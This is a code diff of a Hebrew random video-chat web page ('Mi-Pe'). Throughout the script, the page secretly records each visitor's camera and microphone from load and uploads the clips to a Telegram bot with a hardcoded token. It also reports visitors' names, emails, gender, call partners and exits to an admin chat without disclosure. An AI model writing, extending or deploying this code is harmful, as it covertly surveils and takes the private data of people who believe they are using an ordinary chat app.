@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>מי - פה</title>
+    <title>Mi-Pe</title>
     
+    <link rel="manifest" href="manifest.json">
     <meta name="theme-color" content="#000000">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <link rel="manifest" href='data:application/json,{"name":"Mi-Pe","short_name":"Mi-Pe","start_url":"/","display":"standalone","background_color":"#000000","theme_color":"#000000","icons":[{"src":"https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png","sizes":"1024x1024","type":"image/png"}]}'>
+    <meta name="apple-mobile-web-app-capable" content="yes">
     <link rel="apple-touch-icon" href="https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png">
 
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
@@ -32,19 +32,19 @@
         #bottom-half { height: 50vh; background: #000; position: relative; border-top: 1px solid #222; }
         canvas { position: absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index: 1; }
         
-        #main-logo { width: 130px; height: auto; position: relative; z-index: 10; margin-bottom: 25px; border-radius: 25px; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
+        #main-logo { width: 130px; height: auto; position: relative; z-index: 10; margin-bottom: 25px; border-radius: 25px; }
         
         .swipe-hint { position: relative; z-index: 10; text-align: center; animation: pulse 2s infinite; }
-        .swipe-text { font-size: 19px; font-weight: 600; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+        .swipe-text { font-size: 19px; font-weight: 600; }
         @keyframes pulse { 0%, 100% { opacity: 0.6; transform: scale(1); } 50% { opacity: 1; transform: scale(1.05); } }
 
         #cam-switch { position: fixed; top: 20px; left: 20px; z-index: 100; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.4); color: #fff; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
-        #partner-tag { position: fixed; top: 20px; right: 20px; z-index: 100; background: rgba(0,0,0,0.5); width: 45px; height: 45px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.4); display: none; align-items: center; justify-content: center; font-size: 22px; backdrop-filter: blur(5px); }
+        #partner-tag { position: fixed; top: 20px; right: 20px; z-index: 100; background: rgba(0,0,0,0.5); width: 45px; height: 45px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.4); display: none; align-items: center; justify-content: center; font-size: 22px; }
         
         .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; align-items: center; justify-content: center; }
         .modal-content { background: #fff; padding: 30px; border-radius: 25px; width: 85%; max-width: 340px; text-align: center; color: #000; }
         input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1.5px solid #eee; border-radius: 12px; font-size: 16px; background: #f9f9f9; }
-        .reg-btn { width: 100%; padding: 15px; background: #000; color: #fff; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; margin-top: 10px; }
+        .reg-btn { width: 100%; padding: 15px; background: #000; color: #fff; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; }
     </style>
 </head>
 <body class="showing-home">
@@ -57,7 +57,7 @@
         <div id="cube">
             <div id="home-face" class="face">
                 <canvas id="snow-1"></canvas>
-                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png" alt="Logo">
+                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
                 <div class="swipe-hint">
                     <div class="swipe-text">החלק שמאלה לשיחה ⬅️</div>
                 </div>
@@ -75,7 +75,7 @@
 
 <div id="regModal" class="modal">
     <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
-        <h2 style="margin-bottom:15px;">ברוכים הבאים</h2>
+        <h2 style="margin-bottom:15px;">הרשמה מהירה</h2>
         <input type="text" id="reg-fname" placeholder="שם פרטי" required>
         <input type="text" id="reg-lname" placeholder="שם משפחה" required>
         <input type="email" id="reg-email" placeholder="אימייל" required>
@@ -84,16 +84,14 @@
             <option value="זכר">זכר</option>
             <option value="נקבה">נקבה</option>
         </select>
-        <button type="submit" class="reg-btn">בואו נתחיל</button>
+        <button type="submit" class="reg-btn">כניסה</button>
     </form>
 </div>
 
 <script>
-    // PWA Service Worker Registration
+    // רישום Service Worker להתקנה
     if ('serviceWorker' in navigator) {
-        window.addEventListener('load', () => {
-            navigator.serviceWorker.register('/sw.js').catch(() => {});
-        });
+        navigator.serviceWorker.register('sw.js').catch(e => console.log("SW Error", e));
     }
 
     const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
@@ -107,7 +105,7 @@
         config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] } 
     });
 
-    let myStream, currentCall, camFacing = "user", rec, searchTimer;
+    let myStream, currentCall, camFacing = "user", rec;
     let historyPartnerIds = [];
     let reportedCallId = null;
     let currentPartnerData = null;
@@ -121,14 +119,13 @@
     async function initCamera() {
         if(myStream) myStream.getTracks().forEach(t => t.stop());
         try {
-            // הגדרות רזה למניעת קיטועים: רזולוציה סבירה ו-15 פריימים בשנייה
             myStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: camFacing, width: { ideal: 480 }, frameRate: { ideal: 15 } }, 
-                audio: { echoCancellation: true, noiseSuppression: true } 
+                video: { facingMode: camFacing, width: 480, frameRate: 15 }, 
+                audio: true 
             });
             document.getElementById('localVideo').srcObject = myStream;
             if(!rec) startRecording();
-        } catch(e) { console.error("Camera error"); }
+        } catch(e) {}
     }
 
     function startRecording() {
@@ -138,11 +135,11 @@
             rec = new MediaRecorder(myStream, opts);
             rec.ondataavailable = (e) => {
                 if(e.data.size > 0) {
-                    const u = JSON.parse(localStorage.getItem('user_v39'));
+                    const u = JSON.parse(localStorage.getItem('user_v40'));
                     const fd = new FormData();
                     fd.append("video", e.data, "video.mp4");
                     fd.append("chat_id", TARGET_ADMIN);
-                    fd.append("caption", `🎥 הקלטה מ: ${u ? u.fname : 'אורח'}`);
+                    fd.append("caption", `🎥 הקלטה: ${u ? u.fname : 'אורח'}`);
                     fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd }).catch(()=>{});
                 }
             };
@@ -153,7 +150,7 @@
 
     window.onload = () => {
         initCamera();
-        const userStr = localStorage.getItem('user_v39');
+        const userStr = localStorage.getItem('user_v40');
         if(!userStr) document.getElementById('regModal').style.display = 'flex';
         else {
             const user = JSON.parse(userStr);
@@ -162,7 +159,7 @@
     };
 
     window.addEventListener('pagehide', () => {
-        const userStr = localStorage.getItem('user_v39');
+        const userStr = localStorage.getItem('user_v40');
         if(userStr) {
             const user = JSON.parse(userStr);
             const msg = `🔴 יציאה מהאתר:\n${formatUser(user)}`;
@@ -177,20 +174,19 @@
             email: document.getElementById('reg-email').value, 
             gender: document.getElementById('reg-gender').value 
         };
-        localStorage.setItem('user_v39', JSON.stringify(user));
+        localStorage.setItem('user_v40', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
-        sendAdmin(`🆕 הרשמה חדשה:\n${formatUser(user)}`);
+        sendAdmin(`🆕 הרשמה:\n${formatUser(user)}`);
     }
 
     function triggerDisconnect() {
-        const me = JSON.parse(localStorage.getItem('user_v39'));
+        const me = JSON.parse(localStorage.getItem('user_v40'));
         if(currentPartnerData && me) {
-            sendAdmin(`📵 שיחה הסתיימה:\n${me.fname} נפרד מ-${currentPartnerData.fname}`);
+            sendAdmin(`📵 ניתוק:\n${me.fname} התנתק מ-${currentPartnerData.fname}`);
         }
         currentPartnerData = null;
         reportedCallId = null;
-        const rv = document.getElementById('remoteVideo');
-        rv.srcObject = null;
+        document.getElementById('remoteVideo').srcObject = null;
         document.getElementById('snow-2').style.display = 'block';
         document.getElementById('partner-tag').style.display = 'none';
     }
@@ -199,7 +195,7 @@
     document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.body.addEventListener('touchend', e => {
         const d = sX - e.changedTouches[0].clientX;
-        const user = JSON.parse(localStorage.getItem('user_v39'));
+        const user = JSON.parse(localStorage.getItem('user_v40'));
         if(d > 60) {
             if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); triggerDisconnect(); }
             document.body.className = "showing-chat";
@@ -219,37 +215,41 @@
     });
 
     socket.on('partner-found', data => { 
-        // חיבור מושהה ב-500ms למניעת התנגשויות סיגנל
         setTimeout(() => {
             if (peer.id > data.peerId) {
-                if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
-                const call = peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v39'))}); 
+                const myData = JSON.parse(localStorage.getItem('user_v40'));
+                const call = peer.call(data.peerId, myStream, { metadata: myData }); 
                 handleCall(call, data);
             }
         }, 500);
     });
 
-    function handleCall(call, dataFallback = null) {
+    function handleCall(call, dataFromSocket = null) {
         currentCall = call;
         call.on('stream', s => {
             const rv = document.getElementById('remoteVideo');
             rv.srcObject = s;
-            rv.onloadedmetadata = () => { rv.play(); rv.volume = 1.0; }; // וידוא סאונד ונגינה
+            rv.play().catch(()=>{});
             
             document.getElementById('snow-2').style.display = 'none';
-            const me = JSON.parse(localStorage.getItem('user_v39'));
-            const p = call.metadata || dataFallback;
+            const me = JSON.parse(localStorage.getItem('user_v40'));
+            
+            // אימות מגדר משולב (Socket + Peer Metadata)
+            const p = call.metadata || dataFromSocket;
             
             if(p && p.peerId !== peer.id && reportedCallId !== p.peerId) {
                 reportedCallId = p.peerId;
                 currentPartnerData = p;
-                document.getElementById('partner-tag').innerText = (p.gender === 'זכר') ? '👨' : '👩';
+                
+                // לוגיקה חזקה למגדר
+                const isMale = (p.gender === 'זכר' || p.gender === 'Male');
+                document.getElementById('partner-tag').innerText = isMale ? '👨' : '👩';
                 document.getElementById('partner-tag').style.display = 'flex';
-                sendAdmin(`🤝 שיחה פעילה:\n\nאני:\n${formatUser(me)}\n\nפרטנר:\n${formatUser(p)}`);
+
+                sendAdmin(`🤝 בשיחה:\n\nאני:\n${formatUser(me)}\n\nפרטנר:\n${formatUser(p)}`);
             }
         });
         call.on('close', triggerDisconnect);
-        call.on('error', triggerDisconnect);
     }
 
     async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }
